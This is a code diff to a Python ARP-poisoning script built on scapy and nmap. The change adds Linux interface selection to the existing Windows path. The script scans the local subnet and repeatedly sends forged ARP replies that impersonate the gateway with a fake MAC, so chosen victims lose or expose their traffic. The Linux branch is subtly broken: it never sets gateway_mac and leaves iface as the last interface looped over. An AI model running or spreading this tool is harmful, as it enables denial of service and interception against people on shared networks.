@@ -3,7 +3,8 @@ from time import sleep
 from traceback import print_exc
 from nmap import PortScanner
 from requests import get
-
+from platform import system 
+import netifaces
 
 def get_vendor(mac):
     try:
@@ -32,14 +33,31 @@ def get_ip_macs(ips):
 def poison(victim_ip, victim_mac, gateway_ip, gateway_mac,iface):
     packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:12:12:12:12:12', pdst=victim_ip, hwdst=victim_mac)
     send(packet, verbose=0)
-
-print(IFACES)
-number = input("Enter index of your interface? \n")
-iface = IFACES.dev_from_index(int(number))
-gateway_ip = iface.ip
-gateway_mac  =  iface.mac
-ip_range = gateway_ip.replace(gateway_ip.split(".")[3],"0/24")
-gateway_ip = iface.ip.replace(gateway_ip.split(".")[3],"1")
+if system() == "Windows":
+    print(IFACES)
+    number = input("Enter index of your interface? \n")
+    iface = IFACES.dev_from_index(int(number))
+    gateway_ip = iface.ip
+    gateway_mac  =  iface.mac
+    ip_range = gateway_ip.replace(gateway_ip.split(".")[3],"0/24")
+    gateway_ip = iface.ip.replace(gateway_ip.split(".")[3],"1")
+elif system() == "Linux":
+    ifaces = netifaces.interfaces()
+    c = 1
+    listifaces = {}
+    for iface in ifaces:
+        try:
+            ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
+            listifaces[c] = iface 
+            listifaces[f"{c}ip"] = ip
+            print(f"{c}) IP: {ip} -> {iface}")
+            c+=1
+        except:
+            pass
+    number = int(input("Enter iface number: "))
+    gateway_ip = listifaces[f"{number}ip"]
+    ip_range = gateway_ip.replace(gateway_ip.split(".")[3],"0/24")
+    gateway_ip = gateway_ip.replace(gateway_ip.split(".")[3],"1")
 devices = get_ip_macs(ip_range)
 print(f"Connected ips on {iface} interface:")
 c = 1
@@ -66,5 +84,3 @@ while True:
         poison(victim[0],victim[1],gateway_ip,gateway_mac,iface)
     print(f"Arp poison to {victim[0]} sent!")
     sleep(15)
-
-
